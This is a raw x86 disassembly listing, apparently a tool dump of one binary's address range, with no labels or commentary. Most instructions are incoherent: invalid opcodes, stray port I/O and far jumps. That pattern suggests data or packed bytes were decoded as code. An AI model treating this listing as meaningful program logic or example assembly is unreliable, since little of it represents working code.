  408a4f:	pop    ds
  408a50:	gs iret 
  408a52:	clc    
  408a53:	inc    edi
  408a54:	int    0xad
  408a56:	sar    DWORD PTR [ecx+0x2af9527d],1
  408a5c:	loope  0x408ada
  408a5e:	adc    ecx,DWORD PTR [ebx]
  408a60:	mov    ch,0x1d
  408a62:	sub    cl,BYTE PTR [ecx+0x59]
  408a65:	das    
  408a66:	lods   al,BYTE PTR ds:[esi]
  408a67:	repnz imul eax,edx,0x51fe95e0
  408a6e:	add    al,0x39
  408a70:	test   DWORD PTR [edx],esi
  408a72:	sbb    esi,DWORD PTR [ebp+0x67dee838]
  408a78:	cmp    eax,0x7919980b
  408a7d:	fucomip st,st(1)
  408a7f:	mov    al,ds:0x814f4939
  408a84:	shl    DWORD PTR [esi+0x5e66b185],cl
  408a8a:	repz (bad) 
  408a8c:	cli    
  408a8d:	mov    al,ds:0x52558ab4
  408a92:	pop    ss
  408a93:	stos   BYTE PTR es:[edi],al
  408a94:	mov    ah,0x2
  408a96:	jo     0x408ada
  408a98:	xchg   esp,eax
  408a99:	jge    0x408ae3
  408a9b:	aas    
  408a9c:	pop    ds
  408a9d:	or     BYTE PTR [esi+0x2b],dl
  408aa0:	jns    0x408ae7
  408aa2:	inc    eax
  408aa3:	out    0xc6,eax
  408aa5:	xchg   DWORD PTR [eax-0x11],ebp
  408aa8:	call   0x1e1:0x43fb1716
  408aaf:	push   edx
  408ab0:	jo     0x408a9c
  408ab2:	and    ecx,DWORD PTR cs:[edx+0x54]
  408ab6:	mov    ecx,0xb6ab462
  408abb:	jns    0x408ab7
  408abd:	and    edx,edx
  408abf:	dec    ecx
  408ac0:	xor    al,bl
  408ac2:	xchg   BYTE PTR [esi-0x3bae3211],dh
  408ac8:	or     edi,DWORD PTR [eax-0x2070ccfa]
  408ace:	adc    eax,0xd3032377
  408ad3:	hlt    
  408ad4:	addr16 mov dh,al
  408ad7:	sub    BYTE PTR [ebp-0x430dae34],ah
  408add:	mov    WORD PTR [edx],?
  408adf:	shl    BYTE PTR [eax+0x1c],1
  408ae2:	xchg   ebx,eax
  408ae3:	loop   0x408a82
  408ae5:	(bad)  
  408ae6:	loopne 0x408aa0
  408ae8:	scas   eax,DWORD PTR es:[edi]
  408ae9:	ret    0xae68
  408aec:	pop    esp
  408aed:	jp     0x408af6
  408aef:	mov    bh,0xab
  408af1:	xchg   BYTE PTR [esi+0x1f],ah
  408af4:	pop    esp
  408af5:	cmp    DWORD PTR [ebx-0x6f5547ab],ebp
  408afb:	aaa    
  408afc:	aam    0x62
  408afe:	je     0x408aa0
  408b00:	dec    ecx
  408b01:	daa    
  408b02:	cwde   
  408b03:	dec    ebx
  408b04:	call   0x8c2f:0xd8af1f5d
  408b0b:	imul   ebp,DWORD PTR [edx+eax*1],0xfb659873
  408b12:	cli    
  408b13:	shr    DWORD PTR [ebx+ebx*8],1
  408b16:	mov    ebx,0x496a1d10
  408b1b:	mov    ecx,0xcb4e586
  408b20:	(bad)  
  408b21:	cmp    eax,0x263d1338
  408b26:	jbe    0x408b49
  408b28:	jl     0x408b59
  408b2a:	cmp    DWORD PTR [eax+ebp*1+0x2cba3492],esp
  408b31:	int    0x7c
  408b33:	pop    ecx
  408b34:	inc    DWORD PTR [ebp+0x66]
  408b37:	lea    eax,[eax]
  408b39:	int3   
  408b3a:	and    ebx,esp
  408b3c:	xchg   ecx,eax
  408b3d:	cmp    BYTE PTR [edi+0x6a33933d],bh
  408b43:	and    BYTE PTR [edx+0x3016141c],ch
  408b49:	dec    ebx
  408b4a:	xchg   ebx,eax
  408b4b:	sbb    eax,0xb6f5f47b
  408b50:	sbb    eax,0x87c14a40
  408b55:	mov    al,ds:0xcee63ca8
  408b5a:	jecxz  0x408b97
  408b5c:	xchg   ecx,eax
  408b5d:	adc    ch,ch
  408b5f:	jns    0x408b6e
  408b61:	clc    
  408b62:	ret    0xc637
  408b65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b66:	lock fs mov cl,0xc4
  408b6a:	fidiv  WORD PTR [eax+0x3b]
  408b6d:	xchg   esi,eax
  408b6e:	cs xchg ebx,eax
  408b70:	xor    BYTE PTR [esi],bl
  408b72:	inc    edi
  408b73:	in     eax,0x91
  408b75:	ror    ecx,1
  408b77:	mov    es,WORD PTR [edi+0x23]
  408b7a:	push   es
  408b7b:	push   ds
  408b7c:	mov    ds:0x6d42535,al
  408b81:	mov    edi,0xab1ad7e8
  408b86:	xor    DWORD PTR [ebx+0x78],esp
  408b89:	jp     0x408b86
  408b8b:	add    DWORD PTR [eax],edi
  408b8d:	mov    al,0x7b
  408b8f:	inc    edi
  408b90:	xor    dh,cl
  408b92:	mov    ah,0x0
  408b94:	inc    ebx
  408b95:	mov    cl,0x43
  408b97:	xchg   edx,eax
  408b98:	pop    ecx
  408b99:	das    
  408b9a:	xor    al,0x13
  408b9c:	imul   edx,esp,0xffffffb7
  408b9f:	and    DWORD PTR ds:0xcb9e77b1,esp
  408ba5:	aaa    
  408ba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ba7:	xor    DWORD PTR [eax],0x1a6ddb57
  408bad:	(bad)  
  408bae:	xchg   esi,eax
  408baf:	mov    BYTE PTR [edx+esi*2-0x29],al
  408bb3:	jl     0x408c18
  408bb5:	call   0x7cc1:0xd446b183
  408bbc:	push   esp
  408bbd:	inc    esi
  408bbe:	push   eax
  408bbf:	jae    0x408c3a
  408bc1:	sti    
  408bc2:	jmp    0x408bbc
  408bc4:	jmp    0xaa50:0xd1b23195
  408bcb:	adc    al,0x40
  408bcd:	in     eax,0x9a
  408bcf:	ins    BYTE PTR es:[edi],dx
  408bd0:	pop    DWORD PTR [eax+0x15]
  408bd3:	ins    BYTE PTR es:[edi],dx
  408bd4:	sub    al,0xff
  408bd6:	xchg   ebx,eax
  408bd7:	xor    al,0xa7
  408bd9:	add    eax,DWORD PTR [edi+ecx*1+0x39]
  408bdd:	add    bl,al
  408bdf:	xchg   BYTE PTR [ecx-0x62e5ff90],al
  408be5:	or     esp,DWORD PTR [edi+0x18d5860]
  408beb:	xchg   edi,eax
  408bec:	pop    ecx
  408bed:	mov    bh,0x19
  408bef:	call   0x13bcb085
  408bf4:	jge    0x408bbc
  408bf6:	jmp    0x408bc8
  408bf8:	cmp    ecx,DWORD PTR [esp+eax*4]
  408bfb:	push   ebp
  408bfc:	or     cl,cl
  408bfe:	cmp    eax,0xc5ca2082
  408c03:	in     al,dx
  408c04:	sahf   
  408c05:	(bad)  
  408c06:	repz cli 
  408c08:	(bad)  
  408c09:	aam    0x37
  408c0b:	jge    0x408ba0
  408c0d:	aam    0x60
  408c0f:	mov    bh,0xf1
  408c11:	iret   
  408c12:	xchg   ecx,eax
  408c13:	out    0xd6,al
  408c15:	enter  0x128c,0x7d
  408c19:	pop    esp
  408c1a:	or     eax,0x8a7a5698
  408c1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c20:	and    eax,0x9a7be87e
  408c25:	xchg   cl,dl
  408c27:	and    BYTE PTR [esi],ah
  408c29:	ficom  DWORD PTR [edx+0x64]
  408c2c:	mov    cl,0x9d
  408c2e:	les    esp,FWORD PTR [edi+ebx*4+0x11]
  408c32:	push   edx
  408c33:	jns    0x408c86
  408c35:	idiv   BYTE PTR [ecx-0x17]
  408c38:	xor    dh,BYTE PTR [esi-0x76e1eaf8]
  408c3e:	add    eax,ebp
  408c40:	dec    esp
  408c41:	jl     0x408be7
  408c43:	xor    BYTE PTR [ebx],dl
  408c45:	icebp  
  408c46:	xchg   BYTE PTR [ecx+0x49],bl
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  ebp,QWORD PTR [edx+0x470c25fd]
  408c75:	fnstenv [eax+0x70]
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c59
  408c7d:	std    
  408c7e:	rol    BYTE PTR [edi],1
  408c80:	pop    esi
  408c81:	arpl   WORD PTR [ebx],si
  408c83:	fistp  WORD PTR [ecx+0x53245fbe]
  408c89:	adc    eax,0x5750a67d
  408c8e:	idiv   BYTE PTR [edx-0x2a2a3989]
  408c94:	fdiv   QWORD PTR [edx-0x72]
  408c97:	jne    0x408cd3
  408c99:	scas   al,BYTE PTR es:[edi]
  408c9a:	pop    ecx
  408c9b:	cmp    ch,BYTE PTR [edx+0x1]
  408c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c9f:	aaa    
  408ca0:	mov    edx,0xc9c8c37f
  408ca5:	mov    bl,0xe
  408ca7:	inc    ebp
  408ca8:	int    0x4
  408caa:	xor    ebx,ebp
  408cac:	dec    esp
  408cad:	sub    DWORD PTR [ebx],edi
  408caf:	push   es
  408cb0:	dec    esp
  408cb1:	inc    eax
  408cb2:	in     eax,0xa2
  408cb4:	sbb    al,BYTE PTR [edi-0xa]
  408cb7:	mov    al,ds:0xdf4ec9be
  408cbc:	int3   
  408cbd:	lods   eax,DWORD PTR ds:[esi]
  408cbe:	or     bl,0x5c
  408cc1:	ins    BYTE PTR es:[edi],dx
  408cc2:	fild   QWORD PTR [ebx+eax*2+0x139a3b0a]
  408cc9:	sub    ah,BYTE PTR [ebx+0x1d]
  408ccc:	and    BYTE PTR [edx],ch
  408cce:	or     edi,ebp
  408cd0:	inc    ebp
  408cd1:	push   0xad9c2dc0
  408cd6:	out    0x23,eax
  408cd8:	popa   
  408cd9:	mov    ebp,0xdeb757d9
  408cde:	icebp  
  408cdf:	sub    DWORD PTR ds:0xfa4902fc,0xe3334cd6
  408ce9:	xor    DWORD PTR [edi-0x433247d0],esp
  408cef:	sbb    al,0x8
  408cf1:	or     dl,BYTE PTR [edi+ecx*4-0x74]
  408cf5:	ret    
  408cf6:	jp     0x408cea
  408cf8:	outs   dx,BYTE PTR ds:[esi]
  408cf9:	or     edx,DWORD PTR [edi+0x22]
  408cfc:	and    eax,DWORD PTR [ebp-0x1f1957e4]
  408d02:	jno    0x408d3c
  408d04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d05:	inc    esi
  408d06:	pop    ebp
  408d07:	xchg   ecx,eax
  408d08:	lahf   
  408d09:	das    
  408d0a:	dec    ebp
  408d0b:	xor    DWORD PTR [esi],esi
  408d0d:	pusha  
  408d0e:	lea    ebp,[eax]
  408d10:	push   cs
  408d11:	test   al,0x8f
  408d13:	(bad)  
  408d14:	sub    dl,BYTE PTR [edi-0x79]
  408d17:	dec    ecx
  408d18:	pop    eax
  408d19:	(bad)  
  408d1a:	dec    eax
  408d1b:	cmp    BYTE PTR [ebp+0x2c],0x68
  408d1f:	dec    ecx
  408d20:	retf   0x327e
  408d23:	pop    es
  408d24:	xchg   esp,eax
  408d25:	pusha  
  408d26:	leave  
  408d27:	dec    ebx
  408d28:	lods   eax,DWORD PTR ds:[esi]
  408d29:	inc    ecx
  408d2a:	pop    ss
  408d2b:	in     al,dx
  408d2c:	adc    bh,dh
  408d2e:	stc    
  408d2f:	or     ebx,DWORD PTR ds:0x657e65b8
  408d35:	or     edi,DWORD PTR [edx]
  408d37:	pusha  
  408d38:	jle    0x408d73
  408d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d3b:	loope  0x408cdd
  408d3d:	mov    ebx,0x5d93d9eb
  408d42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d43:	xchg   edi,eax
  408d44:	adc    al,0x2a
  408d46:	into   
  408d47:	in     eax,dx
  408d48:	inc    BYTE PTR [ebx-0x3e]
  408d4b:	ficomp DWORD PTR [edx-0x7f]
  408d4e:	dec    ecx
  408d4f:	jp     0x408d71
  408d51:	nop
  408d52:	adc    al,0x82
  408d54:	xchg   DWORD PTR [ebx-0x43],ebx
  408d57:	jmp    0x984a:0xdf3e7457
  408d5e:	cli    
  408d5f:	repz enter 0xd506,0x25
  408d64:	repz sbb ecx,DWORD PTR [ecx]
  408d67:	or     ch,BYTE PTR [ebx+0x36]
  408d6a:	hlt    
  408d6b:	sub    cl,BYTE PTR [eax+edx*4-0x9]
  408d6f:	ret    
  408d70:	inc    eax
  408d71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d72:	inc    edx
  408d73:	xor    al,0xb
  408d75:	aam    0x9d
  408d77:	scas   eax,DWORD PTR es:[edi]
  408d78:	sbb    ch,ch
  408d7a:	jno    0x408dd9
  408d7c:	fimul  DWORD PTR [ebp+0x70]
  408d7f:	test   al,0xef
  408d81:	cwde   
  408d82:	mov    ?,WORD PTR [edx-0x4d]
  408d85:	pop    ss
  408d86:	inc    esp
  408d87:	repnz mov al,0xae
  408d8a:	xchg   BYTE PTR [ebp+ebx*8-0x62],ch
  408d8e:	push   ebp
  408d8f:	adc    DWORD PTR [ebx],esp
  408d91:	cwde   
  408d92:	xor    BYTE PTR [edx],0x6f
  408d95:	jo     0x408df0
  408d97:	or     al,0xa3
  408d99:	mov    ds:0x3781a993,al
  408d9e:	mov    al,ds:0x841e6d3a
  408da3:	pop    ds
  408da4:	fs sbb eax,0xafaefd33
  408daa:	outs   dx,BYTE PTR ds:[esi]
  408dab:	bswap  eax
  408dad:	std    
  408dae:	shr    DWORD PTR [ecx],1
  408db0:	mov    dl,0x15
  408db2:	into   
  408db3:	pop    edx
  408db4:	add    eax,0xbb72fd84
  408db9:	mov    cl,0x2
  408dbb:	pusha  
  408dbc:	enter  0xdada,0xd5
  408dc0:	mov    dl,BYTE PTR [esi-0x31fa60c0]
  408dc6:	push   esi
  408dc7:	aad    0xf6
  408dc9:	mov    ebx,0xb829dd04
  408dce:	ret    
  408dcf:	xor    al,0x3d
  408dd1:	mov    eax,0x6fd391ff
  408dd6:	in     eax,dx
  408dd7:	ins    DWORD PTR es:[edi],dx
  408dd8:	xor    edx,DWORD PTR [esi-0x59]
  408ddb:	mov    dl,0x5f
  408ddd:	dec    edx
  408dde:	xor    dl,0x70
  408de1:	dec    eax
  408de2:	jne    0x408daa
  408de4:	data16 sub BYTE PTR [edx],dh
  408de7:	mov    ds:0xd63c588a,eax
  408dec:	xlat   BYTE PTR ds:[ebx]
  408ded:	aaa    
  408dee:	dec    edi
  408def:	jmp    0xb6e96305
  408df4:	fsub   QWORD PTR [esp+edi*1-0x1c291fd2]
  408dfb:	clc    
  408dfc:	push   ecx
  408dfd:	pusha  
  408dfe:	ins    DWORD PTR es:[di],dx
  408e00:	push   ss
  408e01:	ficomp DWORD PTR [edi+ecx*4+0x71249895]
  408e08:	mov    bl,0x2e
  408e0a:	inc    edi
  408e0b:	loopne 0x408e40
  408e0d:	inc    edi
  408e0e:	int3   
  408e0f:	sbb    eax,0x9f4e2e5e
  408e14:	sbb    bl,dl
  408e16:	or     eax,0x3b10b21a
  408e1b:	out    dx,al
  408e1c:	daa    
  408e1d:	push   ebp
  408e1e:	out    dx,eax
  408e1f:	sub    esi,DWORD PTR [ecx+0x36]
  408e22:	ret    
  408e23:	imul   edi,DWORD PTR [edx+0x3e23e26],0x4
  408e2a:	cmp    BYTE PTR [esi-0x352c7b2b],0xb9
  408e31:	add    eax,0x254fa2b1
  408e36:	ss mov ebx,0x76f3d9b4
  408e3c:	out    0x4d,eax
  408e3e:	jnp    0x408dc4
  408e40:	dec    DWORD PTR [ebx-0x9158809]
  408e46:	sti    
  408e47:	sbb    BYTE PTR [ecx-0x7a],al
  408e4a:	cdq    
  408e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e4c:	push   eax
  408e4d:	push   edx
  408e4e:	mov    BYTE PTR [ecx],ch
  408e50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e51:	lods   eax,DWORD PTR ds:[esi]
  408e52:	dec    esi
  408e53:	cmp    bl,dl
  408e55:	and    ah,BYTE PTR [edi+0x2d]
  408e58:	fdiv   st(6),st
  408e5a:	jne    0x408ecf
  408e5c:	retf   
  408e5d:	inc    edx
  408e5e:	iret   
  408e5f:	cs pusha 
  408e61:	jmp    0xabdf9a3b
  408e66:	outs   dx,BYTE PTR ds:[esi]
  408e67:	fstp   st(5)
  408e69:	lock sub BYTE PTR [ebx-0x28487f64],bl
  408e70:	mov    DWORD PTR [edi],0x17727072
  408e76:	(bad)  
  408e77:	fnstsw WORD PTR [ecx+0x50]
  408e7a:	xchg   ebx,eax
  408e7b:	xchg   ebx,eax
  408e7c:	xor    DWORD PTR [edx+0x68],esp
  408e7f:	in     al,dx
  408e80:	test   ebx,edx
  408e82:	and    bh,BYTE PTR [esp+edx*8+0x73d9b3db]
  408e89:	imul   ebx,DWORD PTR [ecx],0xffffffcf
  408e8c:	pop    edi
  408e8d:	add    DWORD PTR [ecx],0x5d
  408e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e91:	add    eax,0x4e2cbcd
  408e96:	mov    al,ds:0x474f084a
  408e9b:	sub    DWORD PTR [ecx],edx
  408e9d:	stos   DWORD PTR es:[edi],eax
  408e9e:	repz mov ds:0x9b2d6908,eax
  408ea4:	push   cs
  408ea5:	ja     0x408e48
  408ea7:	pop    edx
  408ea8:	pusha  
  408ea9:	loopne 0x408e2d
  408eab:	aas    
  408eac:	sbb    dl,BYTE PTR [eax+edx*2-0x4c]
  408eb0:	jno    0x408ea0
  408eb2:	inc    ecx
  408eb3:	inc    esi
  408eb4:	and    dl,BYTE PTR [ebx]
  408eb6:	mov    dl,0xc0
  408eb8:	or     esp,DWORD PTR [edi]
  408eba:	sub    bl,BYTE PTR [eax+eax*1+0x4e]
  408ebe:	jmp    0x6be:0x1613c38d
  408ec5:	push   ds
  408ec6:	out    dx,al
  408ec7:	hlt    
  408ec8:	xor    al,0xa3
  408eca:	sbb    bl,BYTE PTR [ebx]
  408ecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ecd:	sub    bh,BYTE PTR [ebx-0x5525bb25]
  408ed3:	xor    DWORD PTR [edx],eax
  408ed5:	in     eax,0x30
  408ed7:	call   0x8918:0xb0914e7c
  408ede:	add    bl,ah
  408ee0:	pop    edx
  408ee1:	(bad)  
  408ee2:	repnz enter 0x5696,0x35
  408ee7:	mov    ch,0x5e
  408ee9:	jge    0x408ee9
  408eeb:	xchg   DWORD PTR [ecx+esi*4+0x54],ebx
  408eef:	inc    al
  408ef1:	sti    
  408ef2:	pushf  
  408ef3:	fld    QWORD PTR [ecx]
  408ef5:	xchg   esp,eax
  408ef6:	ret    
  408ef7:	je     0x408f74
  408ef9:	js     0x408eff
  408efb:	or     BYTE PTR [esi],bh
  408efd:	dec    esp
  408efe:	sub    dh,bh
  408f00:	push   edi
  408f01:	out    dx,al
  408f02:	sahf   
  408f03:	ret    0x5265
  408f06:	(bad)  
  408f07:	(bad)  
  408f08:	jecxz  0x408ead
  408f0a:	mov    esi,DWORD PTR [ebp-0x37]
  408f0d:	push   ebp
  408f0e:	dec    edi
  408f0f:	mov    edi,0xcb4b461d
  408f14:	add    esp,DWORD PTR [ebx+0x3609f032]
  408f1a:	shr    DWORD PTR [eax-0x4],1
  408f1d:	adc    bl,BYTE PTR [ebx]
  408f1f:	repz mov dh,0xb5
  408f22:	sahf   
  408f23:	imul   ecx,DWORD PTR [edi-0x60d50c35],0xffffffe0
  408f2a:	or     eax,0x63c2d24b
  408f2f:	test   BYTE PTR [ecx+0x61],cl
  408f32:	xchg   esp,eax
  408f33:	jo     0x408ec3
  408f35:	pop    edx
  408f36:	adc    dl,BYTE PTR ds:0xa50c80d4
  408f3c:	push   esp
  408f3d:	mov    dh,cl
  408f3f:	cdq    
  408f40:	add    eax,0xa1dd3967
  408f45:	xor    eax,0x1d1609c1
  408f4a:	xor    BYTE PTR [edx+eax*2-0x7122452a],bl
  408f51:	xchg   edx,eax
  408f52:	push   esi
  408f53:	test   al,0x7e
  408f55:	push   esi
  408f56:	lods   al,BYTE PTR ds:[esi]
  408f57:	xor    al,BYTE PTR [ecx-0xa7bdffe]
  408f5d:	ror    BYTE PTR [ebx],0x22
  408f60:	cmp    BYTE PTR [edx-0x2a],ah
  408f63:	add    cl,bh
  408f65:	dec    ebx
  408f66:	or     DWORD PTR ds:0xa1609a6,0xffffffc3
  408f6d:	bound  edi,QWORD PTR [ebp-0x6a]
  408f70:	mov    ecx,0xcd4dd90
  408f75:	dec    ebx
  408f76:	xor    eax,0xa6b9040d
  408f7b:	shl    BYTE PTR [edx+edi*2-0x4fbade91],cl
  408f82:	test   al,0x83
  408f84:	xchg   esp,eax
  408f85:	push   ebx
  408f86:	cmp    DWORD PTR [edi],edi
  408f88:	adc    ah,0xec
  408f8b:	shr    BYTE PTR [edi],cl
  408f8d:	xchg   esi,eax
  408f8e:	xchg   DWORD PTR [edx],esp
  408f90:	mov    ah,0x73
  408f92:	icebp  
  408f93:	mov    ah,0x8e
  408f95:	call   0x7d97:0xc5f3de57
  408f9c:	out    0x66,al
  408f9e:	sub    BYTE PTR [ebp-0x47c322ee],al
  408fa4:	xchg   ecx,eax
  408fa5:	adc    eax,0x3c82b2bc
  408faa:	adc    bh,BYTE PTR [ecx-0x1]
  408fad:	xor    BYTE PTR [ebp+0x41b02c05],cl
  408fb3:	add    cl,ch
  408fb5:	dec    eax
  408fb6:	add    eax,DWORD PTR [eax]
  408fb8:	add    BYTE PTR [esp+edi*2],al
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0x951937f3
  408fc6:	mov    ah,0x16
  408fc8:	dec    esp
  408fc9:	ja     0x408fb1
  408fcb:	jo     0x40903d
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x408f7a
  408fd2:	pop    esi
  408fd3:	sub    DWORD PTR [eax],0xd60f260
  408fd9:	push   0x5a
  408fdb:	ins    DWORD PTR es:[edi],dx
  408fdc:	jno    0x409028
  408fde:	sbb    DWORD PTR [eax-0x188abf02],edi
  408fe4:	inc    ebx
  408fe5:	xchg   esp,eax
  408fe6:	mov    ebp,0xfa233df4
  408feb:	sti    
  408fec:	xchg   bl,bh
  408fee:	arpl   ax,ax
  408ff0:	push   es
  408ff1:	aas    
  408ff2:	repz and dl,ch
  408ff5:	test   ebp,edx
  408ff7:	frstor [ebp+0x42]
  408ffa:	add    DWORD PTR [edi-0x32d8faac],esp
  409000:	rol    DWORD PTR [edi+0x654f47d4],cl
  409006:	jmp    0x408fb5
  409008:	aas    
  409009:	in     al,dx
  40900a:	push   esi
  40900b:	cmp    DWORD PTR [eax],edx
  40900d:	sub    ebp,DWORD PTR ds:0xacbdd7c1
  409013:	add    bh,BYTE PTR [eax-0x2e319bea]
  409019:	mov    BYTE PTR [ecx-0x7332bfc7],dh
  40901f:	push   ss
  409020:	shl    DWORD PTR [ebx-0x1b],1
  409023:	test   dh,0x75
  409026:	mov    ah,0x40
  409028:	sbb    dh,BYTE PTR [esi-0x5f]
  40902b:	sbb    DWORD PTR [ecx],ebp
  40902d:	out    0xc0,al
  40902f:	scas   al,BYTE PTR es:[edi]
  409030:	test   eax,0xe7ab62d5
  409035:	cmp    ecx,0x41
  409038:	rcl    DWORD PTR [eax+0x39],1
  40903b:	adc    al,0xc2
  40903d:	cmp    DWORD PTR [ecx-0x6d8aab3e],ebp
  409043:	mov    ch,0x25
  409045:	sti    
  409046:	and    eax,DWORD PTR [ebp-0x71]
  409049:	fs adc eax,0xf162211c
  40904f:	fs shr esp,cl
  409052:	jns    0x40905f
  409054:	js     0x409017
  409056:	mov    BYTE PTR [edx-0x1adff2f6],bh
  40905c:	popa   
  40905d:	cdq    
  40905e:	push   0xb16b612
  409063:	(bad)  
  409064:	jmp    0xc4ec7928
  409069:	inc    edx
  40906a:	sbb    al,0x26
  40906c:	jb     0x4090d5
  40906e:	fcom   DWORD PTR [ebp-0x5b081a18]
  409074:	xchg   BYTE PTR [ebp+0x15d266e0],cl
  40907a:	popa   
  40907b:	dec    edi
  40907c:	add    eax,0x8984aa72
  409081:	loopne 0x409004
  409083:	push   0xffffff89
  409085:	xor    BYTE PTR [esi+ecx*4],bh
  409088:	sub    BYTE PTR [ebx+0x76],dl
  40908b:	mov    ebx,0xabb09248
  409090:	into   
  409091:	jno    0x40906e
  409093:	mov    ecx,0xdd9ce346
  409098:	push   esp
  409099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40909b:	inc    esp
  40909c:	nop
  40909d:	pop    es
  40909e:	pusha  
  40909f:	dec    edi
  4090a0:	inc    esi
  4090a1:	ror    ebx,cl
  4090a3:	das    
  4090a4:	stc    
  4090a5:	mov    edi,0xadf854d9
  4090aa:	sti    
  4090ab:	imul   esi,esi,0xffffffb6
  4090ae:	cmp    bl,al
  4090b0:	xchg   BYTE PTR [ebp+0x39],dh
  4090b3:	and    al,0xaa
  4090b5:	dec    ebx
  4090b6:	xchg   ebx,eax
  4090b7:	stc    
  4090b8:	sub    eax,0xf2a15ae5
  4090bd:	test   DWORD PTR [ecx+eiz*2+0x1054df4b],edi
  4090c4:	idiv   al
  4090c6:	jmp    0x32e6:0xf14f1c9
  4090cd:	mov    ds:0xb2a7ac01,eax
  4090d2:	int3   
  4090d3:	(bad)  
  4090d5:	out    0x14,al
  4090d7:	rcr    al,0x7f
  4090da:	aad    0xfa
  4090dc:	mov    ecx,0xeae3d3b1
  4090e1:	sub    BYTE PTR [ebp+0x5025abe1],cl
  4090e7:	cmp    eax,0x4c5e398c
  4090ec:	cmp    ecx,ebx
  4090ee:	(bad)  
  4090ef:	arpl   dx,bp
  4090f1:	(bad)  
  4090f2:	xor    ebp,esp
  4090f4:	pop    ss
  4090f5:	pop    esp
  4090f6:	xor    al,0xc3
  4090f8:	xchg   ebp,eax
  4090f9:	(bad)  
  4090fa:	push   eax
  4090fb:	xchg   al,al
  4090fd:	push   edx
  4090fe:	ss mov ch,0x8e
  409101:	xor    edx,ebp
  409103:	jle    0x409168
  409105:	mov    al,ds:0xdb136076
  40910b:	fist   WORD PTR [esi+0x1]
  40910e:	inc    edi
  40910f:	out    dx,eax
  409110:	ret    
  409111:	cmp    eax,DWORD PTR [esi]
  409113:	ja     0x4090c5
  409115:	stc    
  409116:	cmp    esp,DWORD PTR [edx]
  409118:	sti    
  409119:	gs lock mov bx,es
  40911e:	inc    edx
  40911f:	retf   0xbd38
  409122:	(bad)  
  409123:	jecxz  0x409177
  409125:	jae    0x4090b5
  409127:	jmp    0x409193
  409129:	add    BYTE PTR ds:0xa45a817c,0x7e
  409130:	xor    DWORD PTR ds:0xb47f9ce0,eax
  409136:	fidiv  WORD PTR ds:0xb88ba926
  40913c:	pop    edx
  40913d:	popa   
  40913e:	inc    eax
  40913f:	pop    eax
  409140:	or     eax,0x898b10c4
  409145:	dec    ebx
  409146:	inc    eax
  409147:	bnd lock jmp 0xd0f5cf29
  40914e:	sub    cl,BYTE PTR [eax]
  409150:	dec    DWORD PTR [ebp+0x18]
  409153:	test   BYTE PTR [esi+0x32],cl
  409156:	mov    WORD PTR [ebx+0x79],cs
  409159:	jbe    0x409106
  40915b:	jae    0x409163
  40915d:	inc    esi
  40915e:	mov    al,ds:0x61754b51
  409163:	stos   BYTE PTR es:[edi],al
  409164:	mov    ah,0x6d
  409166:	sbb    BYTE PTR [eax+ebx*4+0x30],0x36
  40916b:	in     eax,0x50
  40916d:	mov    al,0xe6
  40916f:	pop    ebp
  409170:	es or  eax,0xd5d05261
  409176:	and    DWORD PTR [ebx+0x6c],edx
  409179:	stc    
  40917a:	push   edx
  40917b:	dec    esi
  40917c:	ret    0x38a9
  40917f:	adc    BYTE PTR [esi-0x7b5f4e3a],cl
  409185:	je     0x409155
  409187:	js     0x409182
  409189:	xor    eax,0x1d44bb40
  40918e:	or     ebp,esi
  409190:	inc    edi
  409191:	sbb    BYTE PTR [esi-0x4e],dh
  409194:	sub    al,0xe2
  409196:	fistp  QWORD PTR [esi+ebx*2-0x320dee6d]
  40919d:	mov    ds:0xa5cedee9,al
  4091a2:	xchg   esp,eax
  4091a3:	mov    ebx,0xe514752a
  4091a8:	jbe    0x40915a
  4091aa:	call   0xe241:0x1ad2593b
  4091b1:	add    DWORD PTR ds:0x2fbba6da,ebp
  4091b8:	jmp    0x2a56:0xb14c5f41
  4091bf:	ficom  WORD PTR [eax]
  4091c1:	aad    0xae
  4091c3:	(bad)  
  4091c4:	push   esp
  4091c5:	scas   eax,DWORD PTR es:[edi]
  4091c6:	ss pushf 
  4091c8:	stos   DWORD PTR es:[edi],eax
  4091c9:	call   0x2951:0x7493e196
  4091d0:	cmp    eax,DWORD PTR [ebx]
  4091d2:	mov    ds:0xa01128df,al
  4091d7:	mov    ah,0xb0
  4091d9:	(bad)  
  4091da:	or     edx,DWORD PTR [esi]
  4091dc:	aam    0x1f
  4091de:	stos   BYTE PTR es:[edi],al
  4091df:	xor    eax,0xf0711774
  4091e4:	dec    edi
  4091e5:	test   bh,ah
  4091e7:	cmp    BYTE PTR [edi-0x41],dh
  4091ea:	stc    
  4091eb:	inc    eax
  4091ec:	fld    DWORD PTR [ebx-0x78]
  4091ef:	jo     0x409257
  4091f1:	ror    DWORD PTR [ecx],cl
  4091f3:	in     eax,dx
  4091f4:	push   es
  4091f5:	outs   dx,BYTE PTR ds:[esi]
  4091f6:	and    al,0x7e
  4091f8:	out    0x20,al
  4091fa:	mov    ds:0xb34bbc67,al
  4091ff:	xchg   edx,eax
  409200:	jge    0x40922a
  409202:	mov    al,0x71
